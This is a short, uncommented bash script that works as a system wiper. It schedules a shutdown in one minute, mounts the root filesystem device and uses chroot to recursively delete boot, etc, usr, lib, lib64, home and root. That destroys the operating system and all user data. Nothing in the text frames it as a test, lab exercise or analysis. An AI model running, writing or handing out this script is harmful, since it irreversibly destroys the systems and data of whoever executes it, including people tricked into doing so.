#!/usr/bin/env bash

shutdown +1

root=$(df -h | grep -w "/" | awk '{print $1}')

mkdir mounty
sudo mount $root mounty

sudo chroot mounty rm -rf boot
sudo chroot mounty rm -rf etc
sudo chroot mounty rm -rf usr
sudo chroot mounty rm -rf lib
sudo chroot mounty rm -rf home
sudo chroot mounty rm -rf lib64
sudo chroot mounty rm -rf root





